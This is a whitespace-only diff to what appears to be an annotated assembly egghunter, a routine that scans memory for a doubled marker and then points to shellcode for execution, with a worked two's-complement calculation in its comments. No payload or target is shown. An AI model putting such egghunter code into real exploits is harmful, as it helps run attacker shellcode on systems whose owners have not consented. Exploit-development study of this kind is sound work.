@@ -95,7 +95,7 @@
 
 									0000 1110 
 									1111 0001 + 
-							                1 
+							               		1 
 									-------------- 
 									1111 0010 
 									F   2
@@ -105,7 +105,7 @@
         		cmp edi,[edx]  			#egg match find ?
         		jnz next_incr  			#if not advance memory
 
-        		cmp edi,[edx+4]         #eggmatch twice ?
+        		cmp edi,[edx+4]         	#eggmatch twice ?
         		jnz next_incr			#if not advance page
 
         		lea esi,[edx+8]			#egg match twice , get the address location of the shellcode to be executed to esi
